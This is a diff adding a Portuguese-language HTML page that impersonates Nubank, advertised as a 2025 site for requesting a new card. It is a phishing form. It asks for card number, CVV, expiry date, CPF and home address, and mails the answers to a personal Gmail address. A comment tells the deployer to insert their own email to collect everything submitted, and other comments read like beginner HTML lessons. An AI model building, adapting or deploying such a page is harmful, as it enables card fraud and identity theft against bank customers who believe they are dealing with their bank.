@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Nubank</title>
+</head>
+<body style="background-image: url(/ASSETS/NUBANKO.jpg);">
+<center>
+    <h1>PEDIR VIA NOVA CARTÃO SITE NUBANK ATUALIZADO 2025</h1>
+    <form method="post" id="fContato" action="mailto:dav.rod1608@gmail.com"> <!-- < colocar o seu email para receber tudo que for enviado -->
+           <!--for = para | esse laber é para o elemento de id nomeusuario-->
+        <label for="cartao">Numero do cartão de credito</label> <!-- Rotulo -->
+        <input type="text" name="numerocartao" id="cartao" size="16" maxlength="19">
+        <!-- a propriedade maxlenght determina a quantidade maxima de caracteres que seu input pode receber -->
+
+        <br><br>
+
+        <label for="cvv">Insira o cvv do cartão</label>
+        <input type="text" name="cvvdocartao" id="cvv" size="3">
+
+        <br><br>
+        <label for="cpf">Insira seu cpf</label>
+        <input type="text" name="cpf" id="cpf" size="11">
+        
+
+        <br><br>
+
+        <label for="data">Insira a data de vencimento do cartão</label>
+        <input type="text" name="vencimento" id="data">
+        <!-- raio permite que o usuario escolha apenas uma opção de varias para identifica que radios diferentes responde o mesmo pergunta colocamos o mesmo nome em todos o que deferencia um radio do outro é seu id, que deve ser único-->
+        
+        <p>Escola apenas uma opção (por favor)</p>
+        <label for="naoQuero">não quero cartão</label>
+        <input type="radio" name="estilocartao" value="não quero um cartão" id="naoQuero">
+        <br><br>
+        <label for="roxo">cartão roxo</label>
+        <input type="radio" name="estilocartao" value="roxo" id="roxo">
+        <br><br>
+        <label for="preto">cartão preto</label>
+        <input type="radio" name="estilocartao" value="preto" id="preto">
+
+        <br><br>
+
+
+        <!-- textarea eh  um elemento do formulario que serve para inserir texto em grande quantidade voce pode definir o tamanho da area utiliazando col e rowl -->
+        <label for="seuEndereco">Insira seu endereço abaixo:</label> <br>
+        <textarea name="endereço" id="seuEndereco" cols="30" rows="5"></textarea>
+
+
+
+
+
+
+
+
+
+
+
+
+
+            <br><br>
+        <!-- faz o envio dos dados preenchidos pelo usuario -->
+        <!-- o atributo faz com que um tenxto apareça dentro do botão -->
+        <input type="submit" value="Enviar">
+    </form>
+</center>
+</body>
+</html>
